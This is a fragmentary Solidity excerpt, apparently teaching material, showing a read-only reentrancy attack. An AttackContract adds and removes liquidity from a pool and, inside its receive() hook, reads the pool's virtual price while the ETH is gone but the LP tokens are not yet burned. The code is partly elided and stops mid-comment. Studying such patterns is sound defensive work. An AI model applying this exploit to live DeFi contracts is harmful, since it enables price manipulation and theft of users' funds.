...
contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
    ...
    function removeLiquidity() external nonReentrant {
        ...
        uint256 share = balanceOf(msg.sender) * 1e18 / totalSupply();
        uint256 ethToReturn = address(this).balance * share / 1e18;
    ...
    function getVirtualPrice() external view returns (uint256 virtualPrice) {
        virtualPrice = address(this).balance * 1e18 / totalSupply();
    }
...
contract AttackContract {
    ...
    constructor(address _pool, address _vulnerableContract) payable {
        pool = ReadOnlyPool(_pool);
        vulnerableContract = VulnerableDeFiContract(_vulnerableContract);
    }

    function initiateAttack() external {
        // add all of this contracts eth to the readonly pool
        pool.addLiquidity{value: address(this).balance}();

        // withdraw all the liquidity
        pool.removeLiquidity();

    }

    receive() payable external {
        // during remove, the eth is returned here

        // now we snapshot the price while the eth balance is gone from the readonly contract,
        // but before the LP tokens have been burned.

        // This will make the virtual price extremely small.
